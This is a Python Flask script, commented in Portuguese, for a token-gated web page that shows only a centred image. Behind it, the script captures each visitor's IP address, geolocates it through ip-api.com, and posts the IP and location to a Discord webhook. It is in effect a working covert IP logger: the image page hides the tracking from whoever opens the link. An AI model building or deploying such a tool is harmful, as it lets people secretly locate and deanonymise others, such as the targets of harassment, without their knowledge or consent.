from flask import Flask, request, abort
import requests, os

# Cria a aplicação Flask
app = Flask(__name__)

# Pega as variáveis de ambiente configuradas no Render
WEBHOOK_URL = os.getenv("WEBHOOK_URL")
SECRET_TOKEN = os.getenv("SECRET_TOKEN")

# Função para buscar a localização do IP usando ip-api.com
def get_location(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        if response.status_code == 200:
            data = response.json()
            cidade = data.get("city", "Desconhecida")
            regiao = data.get("regionName", "Desconhecida")
            pais = data.get("country", "Desconhecido")
            return f"{cidade}, {regiao}, {pais}"
    except:
        pass
    return "Localização não encontrada"

# Rota principal do site
@app.route('/')
def home():
    # Captura o IP real do visitante (via cabeçalho X-Forwarded-For)
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    # Verifica se o token passado na URL é válido
    token = request.args.get("token")
    if token != SECRET_TOKEN:
        abort(403)  # Se não for válido, retorna erro 403 (acesso negado)

    # Busca a localização do IP
    localizacao = get_location(ip)

    # Envia notificação para o Discord com IP e localização
    data = {
        "content": f"📢 Acesso autorizado!\nIP: {ip}\nLocalização: {localizacao}"
    }
    requests.post(WEBHOOK_URL, json=data)

    # Retorna a página HTML com a imagem centralizada
    return '''
        <html>
        <head>
            <style>
                body {
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    background-color: #ffffff;
                    margin: 0;
                }
                img {
                    max-width: 90%;
                    height: auto;
                    border-radius: 10px;
                }
            </style>
        </head>
        <body>
            <img src="https://scontent.fthe13-1.fna.fbcdn.net/v/t1.6435-9/70734133_937164883300936_3042617985685520384_n.jpg?_nc_cat=102&ccb=1-7&_nc_sid=833d8c&_nc_eui2=AeEg_ul9WZc-DS93rlNlOvlLMWfAYLq_TjgxZ8Bgur9OOCBzJzZDDI0Q8bBy6ADwqNwLk_tRNpVEDGEJRUpQ2bhH&_nc_ohc=LXvgAnZY96kQ7kNvwE1JqV3&_nc_oc=Adlnq4erdNFq96saAlYKRY0xxaKTIqqtN2mjiAfcKT_71UrCL84JXX41_33KLhr4WFk&_nc_zt=23&_nc_ht=scontent.fthe13-1.fna&_nc_gid=EDqAjo3fcSpkpljsPuvXYA&oh=00_AfprEfjik8alcWdrT06zl3Alj2qDtod1XMfQeq_hIcCInQ&oe=69A35071"
                 alt="Imagem centralizada">
        </body>
        </html>
    '''

# Inicia o servidor Flask
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000, debug=False)

